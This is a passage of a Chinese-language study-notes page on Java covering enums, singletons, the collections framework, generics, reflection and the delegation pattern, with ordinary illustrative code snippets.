ordinal 值）访问到元素。</p></li>
<li><p>和 EnumSet 不同，EnumMap 不是一个抽象类，所以创建 EnumMap
时可以使用 <code>new</code> 关键字</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">EnumMap&lt;PlayerType, String&gt; enumMap = <span class="keyword">new</span> <span class="title class_">EnumMap</span>&lt;&gt;(PlayerType.class);</span><br></pre></td></tr></table></figure></li>
<li><p>在Java中,<code>静态工厂方法</code>(Static Factory
Method)是一种常用的创建对象的方式。它具有以下特点:</p>
<ol type="1">
<li><p>是静态方法,不需要先创建类的实例,直接通过类名调用。</p></li>
<li><p>方法名称可以良好表达语义,不一定非要与类名相同。</p></li>
<li><p>可以返回任意类型的对象,不仅限于当前类对象。</p></li>
<li><p>可以通过参数调用不同的静态方法返回不同类型或配置的对象。</p></li>
<li><p>可以在创建对象时进行额外初始化配置工作。</p></li>
<li><p>静态工厂方法不必每次都返回新的对象实例。</p></li>
</ol>
<p>相比直接使用构造器,静态工厂方法更加灵活,可以避免构造器的命名或参数限制,返回更合适的对象,做一些额外初始化工作。</p>
<p>但也失去了一些构造器的便利性,比如不能被继承等。</p>
<p>总体来说,静态工厂是获取对象实例很常用的一种设计模式。</p></li>
<li><p>单例（Singleton）用来保证一个类仅有一个对象，并提供一个访问它的全局访问点，在一个进程中。因为这个类只有一个对象，所以就不能再使用
<code>new</code> 关键字来创建新的对象了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br></pre></td></tr></table></figure></li>
<li><p>通常情况下，实现单例并非易事，来看下面这种写法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> Singleton singleton; </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span> <span class="params">()</span>&#123;&#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getSingleton</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (singleton == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (Singleton.class) &#123; </span><br><span class="line">        <span class="keyword">if</span> (singleton == <span class="literal">null</span>) &#123;  </span><br><span class="line">            singleton = <span class="keyword">new</span> <span class="title class_">Singleton</span>(); </span><br><span class="line">        &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> singleton;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>“要用到 <a
target="_blank" rel="noopener" href="https://javabetter.cn/thread/volatile.html">volatileopen in new
window</a>、<a
target="_blank" rel="noopener" href="https://javabetter.cn/thread/synchronized-1.html">synchronizedopen
in new window</a> 关键字等等，但枚举的出现，让代码量减少到极致。”</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">EasySingleton</span>&#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="集合框架listsetmap队列">集合框架：List、Set、Map、队列</h3>
<ol type="1">
<li><p>集合框架的结构图<img
src="https://s2.loli.net/2023/09/08/GRHewptVI7uXZEU.png"
alt="gailan-01" /></p></li>
<li><p>List
的特点是存取有序，可以存放重复的元素，可以用下标对元素进行操作</p></li>
<li><p>ArrayList</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个集合</span></span><br><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"><span class="comment">// 添加元素</span></span><br><span class="line">list.add(<span class="string">&quot;王二&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;沉默&quot;</span>);</span><br><span class="line">list.add(<span class="string">&quot;陈清扬&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历集合 for 循环</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">    System.out.println(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 遍历集合 for each</span></span><br><span class="line"><span class="keyword">for</span> (String s : list) &#123;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除元素</span></span><br><span class="line">list.remove(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 遍历集合</span></span><br><span class="line"><span class="keyword">for</span> (String s : list) &#123;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改元素</span></span><br><span class="line">list.set(<span class="number">1</span>, <span class="string">&quot;王二狗&quot;</span>);</span><br><span class="line"><span class="comment">// 遍历集合</span></span><br><span class="line"><span class="keyword">for</span> (String s : list) &#123;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol type="1">
<li>ArrayList
是由数组实现的，支持<code>随机存取</code>，也就是可以通过<code>下标</code>直接存取元素</li>
<li>从尾部插入和删除元素会比较快捷，从中间插入和删除元素会比较低效，因为涉及到数组元素的复制和移动；</li>
<li>如果内部数组的容量不足时会自动扩容，因此当元素非常庞大的时候，效率会比较低。</li>
</ol></li>
<li><p><code>LinkedList</code>
是由双向链表实现的，不支持随机存取，只能从一端开始遍历，直到找到需要的元素后返回</p>
<ol type="1">
<li>任意位置插入和删除元素都很方便，因为只需要改变前一个节点和后一个节点的引用即可，不像
ArrayList 那样需要复制和移动数组元素；</li>
<li>List 的实现类还有一个 Vector，Vector 是<code>线程安全的</code>，像
get、set、add 这些方法都加了 <code>synchronized</code>
关键字，就导致执行执行效率会比较低，所以现在已经很少用了</li>
</ol></li>
<li><p><code>泛型</code>：限定符 <code>extends</code>
可以缩小泛型的类型范围。</p>
<ol type="1">
<li>Java
泛型只在<code>编译</code>时起作用，运行时并不会保留<code>泛型</code>类型信息</li>
</ol></li>
<li><p>Java迭代器<code>Iterator</code>和<code>Iterable</code>有什么区别</p>
<ol type="1">
<li><strong>Iterable 接口</strong>：
<ul>
<li><code>Iterable</code> 是一个接口，用于表示对象是可迭代的。任何实现了
<code>Iterable</code> 接口的类都可以被用于增强型 for 循环。</li>
<li><code>Iterable</code> 接口要求实现 <code>iterator()</code>
方法，该方法返回一个实现了 <code>Iterator</code> 接口的对象。</li>
</ul></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Iterable</span>&lt;T&gt; &#123;</span><br><span class="line">    Iterator&lt;T&gt; <span class="title function_">iterator</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li><strong>Iterator 接口</strong>：
<ul>
<li><code>Iterator</code>
是一个接口，用于提供一种遍历集合的方式，允许逐个访问集合中的元素。</li>
<li><code>Iterator</code> 接口定义了方法如
<code>hasNext()</code>、<code>next()</code> 和
<code>remove()</code>，用于检查是否还有下一个元素、获取下一个元素以及删除当前元素。</li>
</ul></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Iterator</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">hasNext</span><span class="params">()</span>;</span><br><span class="line">    T <span class="title function_">next</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>总结区别</strong>：</p>
<ul>
<li><code>Iterable</code> 接口用于表示一个对象可以被迭代，提供了
<code>iterator()</code> 方法。</li>
<li><code>Iterator</code>
接口用于实际的迭代，提供了在集合中移动和访问元素的方法。</li>
</ul>
<p>在使用增强型 for 循环时，Java 会自动使用 <code>Iterable</code>
接口，而 <code>Iterator</code>
接口通常用于手动控制迭代过程。例如，可以通过调用 <code>iterator()</code>
方法获取一个 <code>Iterator</code> 对象，然后使用 <code>hasNext()</code>
和 <code>next()</code> 方法来遍历集合。</p></li>
<li><p>Set
的特点是存取无序，不可以存放重复的元素，不可以用下标对元素进行操作</p></li>
<li><p>如果我们需要按照顺序存储一组元素，那么<code>ArrayList</code>和<code>LinkedList</code>可能更适合；如果我们需要存储键值对并根据键进行查找，那么<code>HashMap</code>可能更适合。</p></li>
<li><p>HashSet仍然是<strong>最好的选择</strong>。例如，当我们需要快速查找一个元素是否存在于某个集合中，并且我们不需要对元素进行排序时，HashSet可以提供高效的性能</p></li>
<li><p>LinkedHashSet 虽然继承自 HashSet，其实是由
<code>LinkedHashMap</code> 实现的。</p></li>
<li><p>TreeSet 是由 <code>TreeMap（</code>后面会讲）
实现的，只不过同样操作的键位，值由一个固定的 Object 对象填充。</p></li>
<li><p>TreeSet 是一种基于<code>红黑树</code>实现的有序集合，它实现了
<code>SortedSet</code>
接口，可以自动对集合中的元素进行排序。按照键的自然顺序或指定的比较器顺序进行排序。</p></li>
<li><p>TreeSet 不允许插入 <code>null</code> 元素，否则会抛出
NullPointerException 异常</p></li>
<li><p><code>ArrayDeque</code>
是一个基于数组实现的双端队列，为了满足可以同时在数组两端插入或删除元素的需求，数组必须是循环的，也就是说数组的任何一点都可以被看作是起点或者终点</p></li>
<li><p><code>LinkedList</code> 一般应该归在 List 下，只不过，它也实现了
Deque 接口，可以作为队列来使用。等于说，LinkedList 同时实现了
Stack、Queue、PriorityQueue 的所有功能。</p>
<ul>
<li><code>底层实现</code>方式不同：LinkedList 是基于链表实现的，而
ArrayDeque 是基于数组实现的。</li>
<li><code>随机访问</code>的效率不同：由于底层实现方式的不同，LinkedList
对于随机访问的效率较低，时间复杂度为 O(n)，而 ArrayDeque
可以通过下标随机访问元素，时间复杂度为 O(1)。</li>
<li><code>迭代器</code>的效率不同：LinkedList
对于迭代器的效率比较低，因为需要通过链表进行遍历，时间复杂度为 O(n)，而
ArrayDeque
的迭代器效率比较高，因为可以直接访问数组中的元素，时间复杂度为
O(1)。</li>
<li><code>内存占用</code>不同：由于 LinkedList
是基于链表实现的，它在存储元素时需要额外的空间来存储链表节点，因此内存占用相对较高，而
ArrayDeque 是基于数组实现的，内存占用相对较低</li>
</ul></li>
<li><p>在使用 LinkedList 作为队列时，可以使用 <code>offer()</code>
方法将元素添加到队列的末尾，使用 <code>poll()</code>
方法从队列的头部删除元素</p></li>
<li><p><code>PriorityQueue</code>
是一种优先级队列，它的出队顺序与元素的优先级有关，要想有<code>优先级</code>，元素就需要实现
Comparable 接口或者 Comparator 接口</p></li>
<li><p><code>HashMap</code> 实现了 Map
接口，可以根据键快速地查找对应的值——通过哈希函数将键映射到哈希表中的一个索引位置，从而实现快速访问</p>
<ul>
<li>HashMap 中的键和值都可以为 null。如果键为
null，则将该键映射到哈希表的第一个位置。</li>
<li>可以使用迭代器或者 forEach 方法遍历 HashMap 中的键值对。</li>
<li>HashMap
有一个初始容量和一个负载因子。初始容量是指哈希表的初始大小，负载因子是指哈希表在扩容之前可以存储的键值对数量与哈希表大小的比率。默认的初始容量是
16，负载因子是 0.75</li>
</ul></li>
<li><p>HashMap
已经非常强大了，但它是无序的。如果我们需要一个<strong>有序</strong>的Map，就要用到
LinkedHashMap。LinkedHashMap 是 HashMap
的<strong>子类</strong>，它使用链表来记录插入/访问元素的顺序。</p>
<p>LinkedHashMap 可以看作是 <code>HashMap + LinkedList</code>
的合体，它使用了哈希表来存储数据，又用了双向链表来维持顺序。</p></li>
<li><p>TreeMap 实现了 <code>SortedMap</code>
接口，可以自动将键按照<strong>自然顺序</strong>或指定的<code>比较器</code>顺序排序，并保证其元素的顺序。内部使用<code>红黑树</code>来实现键的排序和查找。</p></li>
</ol>
<h3 id="java范型">Java范型</h3>
<ol type="1">
<li><p>泛型方法的定义<img
src="https://s2.loli.net/2023/09/16/ZsRn9Y4cu1kKfXd.png"
alt="generic-01" /></p></li>
<li><p>限定符 <code>extends</code> 可以缩小泛型的类型范围</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Arraylist</span>&lt;E <span class="keyword">extends</span> <span class="title class_">Wanger</span>&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>虚拟机</code>是没有泛型的</p></li>
<li><p>通配符使用英文的问号<code>（?）</code>来表示。在我们创建一个泛型对象时，可以使用关键字
<code>extends</code> 限定子类，也可以使用关键字 <code>super</code>
限定父类</p></li>
<li><p>Java
虚拟机会将泛型的类型变量<code>擦除</code>，并替换为限定类型（没有限定的话，就用
<code>Object</code>）</p></li>
<li><p>通配符用于表示某种未知的类型，例如 <code>List&lt;?&gt;</code>
表示一个可以存储任何类型对象的
List，但是不能对其中的元素进行<code>添加</code>操作。</p></li>
</ol>
<h3 id="java-foreach陷阱">Java foreach陷阱</h3>
<ol type="1">
<li>fail-fast
是一种通用的系统设计思想，一旦检测到可能会发生错误，就立马抛出异常</li>
<li>在阿里巴巴的 Java 开发手册里也提到了，不要在 for-each
循环里进行元素的 <code>remove/add</code> 操作。remove 元素请使用
Iterator 方式。</li>
<li>正确操作：<strong>remove 后 break</strong>Java反射</li>
</ol>
<h3 id="java-hashmap">Java HashMap</h3>
<ol type="1">
<li>HashMap
的实现原理是基于<code>哈希表</code>的，它的<code>底层</code>是一个数组，数组的每个位置可能是一个<code>链表</code>或<code>红黑树</code>，也可能只是一个键值对（后面会讲）。当添加一个键值对时，HashMap
会根据键的哈希值计算出该键对应的数组下标（索引），然后将键值对插入到对应的位置。</li>
</ol>
<h3 id="java-linkedhashmap">Java LinkedHashMap</h3>
<ol type="1">
<li>HashMap
也不例外，有一种需求它就满足不了，假如我们需要一个按照<strong>插入顺序</strong>来排列的键值对集合，那
HashMap 就无能为力了</li>
<li>LinkedHashMap 就是为这个需求应运而生的。LinkedHashMap
<code>继承</code>了 HashMap，所以 HashMap
有的关于键值对的功能，它也有了</li>
<li>在此基础上，LinkedHashMap
内部追加了<code>双向链表</code>，来维护元素的插入顺序。注意下面代码中的
<code>before</code> 和
<code>after</code>，它俩就是用来维护当前元素的前一个元素和后一个元素的顺序的</li>
<li>LinkedHashMap
不仅能够维持插入顺序，还能够维持<code>访问顺序</code></li>
<li>使用 LinkedHashMap 来实现 LRU 缓存</li>
<li>它的<code>头节点</code>表示最早插入或访问的元素，<code>尾节点</code>表示最晚插入或访问的元素</li>
</ol>
<h3 id="java-treemap">Java TreeMap</h3>
<ol type="1">
<li>TreeMap
由<code>红黑树</code>实现，可以保持元素的<code>自然顺序</code>，或者实现了
<code>Comparator</code> 接口的自定义顺序
<ol type="1">
<li>红黑树（英语：Red–black tree）是一种自平衡的二叉查找树（Binary
Search Tree）</li>
<li><code>AVL树</code>是一种高度平衡的二叉查找树，它要求左子树和右子树的<code>高度差</code>不超过1。由于AVL树的平衡度比较高，因此在进行插入和删除操作时需要进行更多的旋转操作来保持平衡，但是在<code>查找操</code>作时效率较高。AVL树适用于读操作比较多的场景</li>
</ol></li>
<li>TreeMap
的元素是经过排序的，那找出最大的那个，最小的那个，或者找出所有大于或者小于某个值的键来说，就方便多了。</li>
<li>选择map
<ol type="1">
<li>按照<code>键排序</code>，则可以使用
TreeMap;如果不需要排序，则可以使用 HashMap 或 LinkedHashMap</li>
<li>是否需要高效的查找。如果需要高效的查找，则可以使用 LinkedHashMap 或
HashMap，因为它们的查找操作的时间复杂度为 O(1)，而是 TreeMap 是 O(log
n)</li>
</ol></li>
</ol>
<h3 id="双端队列-arraydeque">双端队列 ArrayDeque</h3>
<ol type="1">
<li><p>当需要使用栈时，Java
已不推荐使用<em>Stack</em>，而是推荐使用更高效的<em>ArrayDeque</em>（双端队列），第一次讲<code>集合框架</code>的时候，Stack
是一个“原始”类，它的核心方法上都加了 <code>synchronized</code>
关键字以确保线程安全，当我们不需要线程安全（比如说单线程环境下）性能就会比较差。</p></li>
<li><p><code>ArrayDeque</code> 又实现了 <code>Deque</code>
接口（<code>Deque</code> 又实现了 <code>Queue</code> 接口）</p></li>
<li><p>要讲栈和队列，首先要讲<em>Deque</em>接口。<em>Deque</em>的含义是“double
ended
queue”，即双端队列，它既可以当作<code>栈</code>使用，也可以当作队列使用</p>
<p>下表列出了<em>Deque</em>与<em>Stack</em>对应的接口：</p>
<table>
<colgroup>
<col style="width: 16%" />
<col style="width: 31%" />
<col style="width: 52%" />
</colgroup>
<thead>
<tr class="header">
<th>Stack Method</th>
<th>Equivalent Deque Method</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>push(e)</td>
<td>addFirst(e)</td>
<td>向栈顶插入元素，失败则抛出异常</td>
</tr>
<tr class="even">
<td>无</td>
<td>offerFirst(e)</td>
<td>向栈顶插入元素，失败则返回<code>false</code></td>
</tr>
<tr class="odd">
<td>pop()</td>
<td>removeFirst()</td>
<td>获取并删除栈顶元素，失败则抛出异常</td>
</tr>
<tr class="even">
<td>无</td>
<td>pollFirst()</td>
<td>获取并删除栈顶元素，失败则返回<code>null</code></td>
</tr>
<tr class="odd">
<td>peek()</td>
<td>getFirst()</td>
<td>获取但不删除栈顶元素，失败则抛出异常</td>
</tr>
<tr class="even">
<td>无</td>
<td>peekFirst()</td>
<td>获取但不删除栈顶元素，失败则返回<code>null</code></td>
</tr>
</tbody>
</table></li>
<li><p><em>ArrayDeque</em>是<code>非线程安全</code>的（not
thread-safe）</p></li>
<li><p>ArrayDeque 是 Java
标准库中的一种双端队列实现，底层基于<code>数组</code>实现。<strong>与
LinkedList 相比</strong>，ArrayDeque
的性能更优，因为它使用连续的内存空间存储元素，可以更好地利用 CPU
缓存，在大多数情况下也更快。</p>
<p>因为ArrayDeque 的底层实现是<code>数组</code>，而 LinkedList
的底层实现是<code>链表</code>。数组是一段连续的内存空间，而链表是由多个节点组成的，每个节点存储数据和指向下一个节点的指针。因此，在使用
LinkedList 时，需要频繁进行内存分配和释放，而 ArrayDeque
在创建时就一次性分配了连续的内存空间，不需要频繁进行内存分配和释放，这样可以更好地利用
CPU 缓存，提高访问效率。</p></li>
</ol>
<h3 id="java-优先级队列priorityqueue">Java 优先级队列PriorityQueue</h3>
<ol type="1">
<li><p>PriorityQueue
就是一个队列，但是它不是先进先出的，而是按照<code>元素优先级</code>进行排序的。当你往
PriorityQueue
中插入一个元素时，它会自动根据元素的优先级将其插入到合适的位置。当你从
PriorityQueue 中删除一个元素时，它会自动将优先级最高的元素出队</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建 PriorityQueue 对象，并指定优先级顺序</span></span><br><span class="line">PriorityQueue&lt;String&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(Comparator.reverseOrder());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素到 PriorityQueue</span></span><br><span class="line">priorityQueue.offer(<span class="string">&quot;沉默王二&quot;</span>);</span><br><span class="line">priorityQueue.offer(<span class="string">&quot;陈清扬&quot;</span>);</span><br><span class="line">priorityQueue.offer(<span class="string">&quot;小转铃&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印 PriorityQueue 中的元素</span></span><br><span class="line">System.out.println(<span class="string">&quot;PriorityQueue 中的元素：&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (!priorityQueue.isEmpty()) &#123;</span><br><span class="line">    System.out.print(priorityQueue.poll() + <span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="comparable-和-comparator">Comparable 和 Comparator</h3>
<ol type="1">
<li><p>一个类实现了 Comparable
接口，意味着该类的对象可以直接进行比较（排序），但比较（排序）的方式只有一种，很<strong>单一</strong>。</p>
<p>一个类如果想要保持原样，又需要进行<strong>不同方式</strong>的比较（排序），就可以定制比较器（实现
Comparator 接口）。</p>
<p>Comparable 接口在 <code>java.lang</code> 包下，而
<code>Comparator</code> 接口在 <code>java.util</code>
包下，算不上是亲兄弟，但可以称得上是表（堂）兄弟。</p></li>
<li></li>
</ol>
<h3 id="java反射">Java反射</h3>
<ol type="1">
<li><p>缺陷</p>
<ol type="1">
<li><strong>破坏封装</strong>：由于反射允许访问私有字段和私有方法，所以可能会破坏封装而导致安全问题。</li>
<li><strong>性能开销</strong>：由于反射涉及到动态解析，因此无法执行 Java
虚拟机优化，再加上反射的写法的确要复</li>
</ol></li>
<li><p>反射的主要应用场景有：</p>
<ul>
<li><strong>开发通用框架</strong>：像
Spring，为了保持通用性，通过配置文件来加载不同的对象，调用不同的方法。</li>
<li><strong>动态代理</strong>：在面向切面编程中，需要拦截特定的方法，就会选择动态代理的方式，而动态代理的底层技术就是反射。</li>
<li><strong>注解</strong>：注解本身只是起到一个标记符的作用，它需要利用发射机制，根据标记符去执行特定的行为。</li>
</ul></li>
<li><p>example</p>
<ol type="1">
<li>获取反射类的 Class 对象：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;com.itwanger.s39.Writer&quot;);</span><br></pre></td></tr></table></figure>
<p>Java 中的每个类型（包括类、接口、数组以及基础类型）在 JVM
中都有一个<code>唯一的 Class 对象</code>与之对应。这个 Class
对象被创建的时机是在 JVM 加载类时，由 JVM 自动完成。</p>
<p>Class
对象中包含了与类相关的很多信息，如类的名称、类的父类、类实现的接口、类的构造方法、类的方法、类的字段等等。这些信息通常被称为<code>元数据（metadata）</code></p>
<ol start="2" type="1">
<li><p>通过 Class 对象获取构造方法 Constructor 对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor();</span><br></pre></td></tr></table></figure></li>
<li><p>第三步，通过 Constructor 对象初始化反射类对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance();</span><br></pre></td></tr></table></figure></li>
<li><p>第四步，获取要调用的方法的 Method 对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">setNameMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getNameMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getName&quot;</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>第五步，通过 <code>invoke()</code> 方法执行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setNameMethod.invoke(object, <span class="string">&quot;沉默王二&quot;</span>);</span><br><span class="line">getNameMethod.invoke(object)</span><br></pre></td></tr></table></figure></li>
</ol></li>
<li><p>要想使用反射，首先需要获得反射类的 Class
对象，每一个类，<em>不管它最终生成了多少个对象，这些对象只会对应一个
Class 对象</em>，这个 Class 对象是由 Java
虚拟机生成的，由它来获悉整个类的结构信息。</p></li>
<li><p>Java中的<code>委派模式（Delegation Pattern）</code>是一种设计模式，它允许一个对象（委派对象）将特定的任务或责任委托给另一个对象来执行，而不是自己执行。在委派模式中，委派对象负责将任务分派给其他对象，这些被分派的对象通常被称为委派对象的代理或助手。</p>
<p>委派模式有助于降低代码的复杂性，提高代码的可维护性和可扩展性，因为它将不同的责任分离到不同的对象中，使每个对象只需要关注自己的特定任务。委派模式通常用于以下情况：</p>
<ol type="1">
<li><p><strong>任务分配：</strong>
当一个对象需要执行多个任务，而这些任务可以被不同的对象处理时，委派模式可以用于将任务分派给合适的对象。</p></li>
<li><p><strong>复杂性管理：</strong>
当一个对象的职责变得过于复杂，难以维护时，委派模式可以用于将职责分解到多个对象中，使代码更清晰。</p></li>
<li><p><strong>策略模式：</strong>
委派模式可以与策略模式结合使用，允许对象在运行时选择不同的算法或策略来完成任务。</p></li>
</ol>
<p>在Java中，委派模式的实现通常包括以下组成部分：</p>
<ol type="1">
<li><p><strong>委派对象（Delegator）：</strong>
负责接收任务并将其委派给具体的实现对象。</p></li>
<li><p><strong>具体实现对象（Delegate）：</strong>
真正执行任务的对象，它们实现了特定的接口或抽象类，以便能够被委派对象调用。</p></li>
<li><p><strong>接口或抽象类（Delegate Interface/Abstract
Class）：</strong>
描述了具体实现对象必须实现的方法，以确保它们具有一致的接口。</p></li>
</ol>
<p>以下是一个简单的Java委派模式示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 委派对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Delegator</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Delegate delegate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Delegator</span><span class="params">()</span> &#123;</span><br><span class="line">        delegate = <span class="keyword">new</span> <span class="title class_">ConcreteDelegateA</span>(); <span class="comment">// 默认使用具体实现对象A</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doTask</span><span class="params">()</span> &#123;</span><br><span class="line">        delegate.doTask();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDelegate</span><span class="params">(Delegate newDelegate)</span> &#123;</span><br><span class="line">        delegate = newDelegate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Delegate</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">doTask</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体实现对象A</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteDelegateA</span> <span class="keyword">implements</span> <span class="title class_">Delegate</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doTask</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Delegate A is handling the task.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体实现对象B</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteDelegateB</span> <span class="keyword">implements</span> <span class="title class_">Delegate</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doTask</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Delegate B is handling the task.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述示例中，<code>Delegator</code>是委派对象，它将任务委派给具体的实现对象（<code>ConcreteDelegateA</code>
或 <code>ConcreteDelegateB</code>）。通过调用 <code>doTask</code>
方法，<code>Delegator</code>将任务分派给当前的委派对象。你可以根据需要更改委派对象，以切换不同的具体实现。这种方式使得委派对象可以动态地选择不同的实现对象来执行任务。</p></li>
<li><p>委派模式的实现可以分为两种主要方式：本地实现和动态实现。</p>
<ol type="1">
<li><p><strong>本地实现（Static Delegation）：</strong>
在本地实现中，委派对象在<code>编译时</code>已经确定了委派关系，即在代码中显式指定了具体的实现对象。本地实现通常在代码中使用关键字或方法调用来选择实际执行任务的委派对象。这种方式通常是静态的，不支持在运行时更改委派对象。</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 委派对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Delegator</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Delegate delegate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Delegator</span><span class="params">()</span> &#123;</span><br><span class="line">        delegate = <span class="keyword">new</span> <span class="title class_">ConcreteDelegateA</span>(); <span class="comment">// 静态地选择实现对象A</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doTask</span><span class="params">()</span> &#123;</span><br><span class="line">        delegate.doTask();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>动态实现（Dynamic Delegation）：</strong>
在动态实现中，委派对象在<code>运行时</code>根据条件或策略来选择委派给哪个具体的实现对象。这种方式通常使用条件语句、配置文件或其他运行时信息来确定委派关系，因此更加灵活，支持在运行时动态更改委派对象。</p>
<p><strong>示例代码：</strong></p>
